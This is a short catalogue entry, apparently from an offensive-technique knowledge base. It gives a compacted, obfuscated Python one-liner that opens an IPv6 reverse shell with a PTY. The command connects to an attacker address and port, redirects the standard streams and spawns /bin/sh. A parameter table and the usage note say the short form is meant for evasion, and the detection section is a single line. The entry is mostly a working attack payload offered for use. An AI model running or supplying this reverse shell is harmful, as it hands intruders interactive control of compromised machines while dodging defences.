---
id: ea580ee4-aa9b-4c2a-a027-a7abbed56aef
type: code
language: Python
verified: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Linux
tags:
  - reverse-shell
  - python
  - ipv6
  - obfuscated
  - pty
validated: true
---

# Python-Short-Obfuscated-IPv6-Reverse-Shell-PTY

## Code

```python
python -c 'a=__import__;c=a("socket");o=a("os").dup2;p=a("pty").spawn;s=c.socket(c.AF_INET6,c.SOCK_STREAM);s.connect(("dead:beef:2::125c",4242,0,2));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p("/bin/sh")'
```

## Description

Compacted obfuscated IPv6 PTY reverse shell.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $_ATTACKER_IPV6 | Attacker's IPv6 address | dead:beef:2::125c |
| $_ATTACKER_PORT | Attacker's listening port | 4242 |

## Usage

Short form for IPv6 evasion.

## Detection

- Short aliases + IPv6 connect.

## Related

- [[procedures/Establish-Python-Reverse-Shell]]
